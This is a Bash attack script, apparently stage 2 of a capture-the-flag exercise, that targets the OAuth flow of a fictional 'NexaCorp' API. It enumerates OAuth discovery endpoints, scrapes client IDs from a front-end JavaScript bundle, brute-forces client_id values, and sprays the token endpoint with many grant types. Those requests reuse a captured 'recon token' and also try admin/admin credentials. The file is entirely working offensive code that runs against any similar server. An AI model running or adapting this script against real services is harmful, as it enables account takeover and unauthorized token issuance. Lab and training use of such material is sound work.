#!/usr/bin/env bash
# Stage 2 — OAuth flow exploitation
# Pista: "Una credencial destinada a otra persona termina en tus manos"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

OAUTH_AUTHORIZE="${API_URL}/oauth/authorize"
OAUTH_TOKEN="${API_URL}/oauth/token"

echo "[*] 1) /.well-known/oauth & openid"
for p in /.well-known/openid-configuration /.well-known/oauth-authorization-server /.well-known/oauth /oauth/.well-known/configuration; do
  code=$(curl -s -o /tmp/_b -w '%{http_code}' "${API_URL}${p}")
  echo "  [${code}] ${p}"
  if [[ "${code}" == "200" ]]; then
    cat /tmp/_b | head -c 800
    echo
  fi
done
echo

echo "[*] 2) Buscar client_id en el bundle JS"
BUNDLE="${LOOT_DIR}/app.bundle.js"
[[ -f "${BUNDLE}" ]] || curl -s "${FRONT_URL}/assets/app.bundle.js" -o "${BUNDLE}"
grep -oE '"(client_id|clientId|client-id)"[[:space:]]*:[[:space:]]*"[^"]+"' "${BUNDLE}" | sort -u
grep -oE 'client_id[[:space:]]*[:=][[:space:]]*["'\''][^"'\'']+["'\'']' "${BUNDLE}" | sort -u
grep -oiE '"nexacorp[a-z0-9-]+"' "${BUNDLE}" | sort -u | head -20
grep -oE '"[a-zA-Z0-9_-]{4,30}-?(client|portal|app|spa|web)[a-zA-Z0-9_-]*"' "${BUNDLE}" | sort -u | head -20
echo

echo "[*] 3) Brute-force client_id contra /oauth/authorize"
REDIRECT="http://localhost/cb"
CLIENTS=(
  nexacorp nexacorp-portal nexacorp-app nexacorp-web nexacorp-spa
  nexacorp-cloud nexacorp-cloud-platform nexacorp-frontend
  portal app web frontend client cloud cloud-platform
  nexacorp-public nexacorp-internal nexacorp-admin
  nexacorp-prod nexacorp-staging
  api graphql vault recon
)
for c in "${CLIENTS[@]}"; do
  resp=$(curl -s -o /tmp/_b -w '%{http_code}' -G "${OAUTH_AUTHORIZE}" \
    --data-urlencode "client_id=${c}" \
    --data-urlencode "redirect_uri=${REDIRECT}" \
    --data-urlencode "response_type=code")
  body=$(cat /tmp/_b)
  # filtra "Unknown client_id" para mostrar solo hits
  if ! echo "${body}" | grep -q "Unknown client_id"; then
    echo "  [${resp}] client_id=${c}"
    echo "    ${body:0:300}"
    echo
  fi
done
echo

echo "[*] 4) Si hay un client_id válido, probar el flow completo"
echo "    (el script imprimirá el primer hit; copia y reutiliza manualmente)"
echo

echo "[*] 5) /oauth/token — probar grant_types y custom params con recon_token"

cat > /tmp/oauth_attempts.txt <<EOF
grant_type=authorization_code&code=${RECON_TOKEN}
grant_type=refresh_token&refresh_token=${RECON_TOKEN}
grant_type=client_credentials&client_assertion=${RECON_TOKEN}
grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=${RECON_TOKEN}&subject_token_type=urn:ietf:params:oauth:token-type:jwt
grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=${RECON_TOKEN}
grant_type=recon&token=${RECON_TOKEN}
grant_type=oauth_init&token=${RECON_TOKEN}
grant_type=password&username=admin&password=admin
grant_type=password&username=admin&recon_token=${RECON_TOKEN}
EOF

while IFS= read -r body; do
  [[ -z "${body}" ]] && continue
  echo "--- ${body:0:80}... ---"
  curl -s -X POST "${OAUTH_TOKEN}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "${body}" -w '\n[%{http_code}]\n'
  echo
done < /tmp/oauth_attempts.txt

echo
echo "[*] 6) Probar JSON body en /oauth/token"
for gt in authorization_code recon oauth_init token_exchange; do
  echo "--- json grant_type=${gt} ---"
  curl -s -X POST "${OAUTH_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"grant_type\":\"${gt}\",\"code\":\"${RECON_TOKEN}\",\"token\":\"${RECON_TOKEN}\",\"recon_token\":\"${RECON_TOKEN}\",\"assertion\":\"${RECON_TOKEN}\"}" \
    -w '\n[%{http_code}]\n'
  echo
done

echo
echo "[*] 7) Probar /oauth/authorize con recon_token como Bearer"
curl -sv -G "${OAUTH_AUTHORIZE}" \
  --data-urlencode "client_id=nexacorp-portal" \
  --data-urlencode "redirect_uri=http://localhost/cb" \
  --data-urlencode "response_type=code" \
  -H "Authorization: Bearer ${RECON_TOKEN}" 2>&1 | grep -E '< HTTP|< Location|^{'
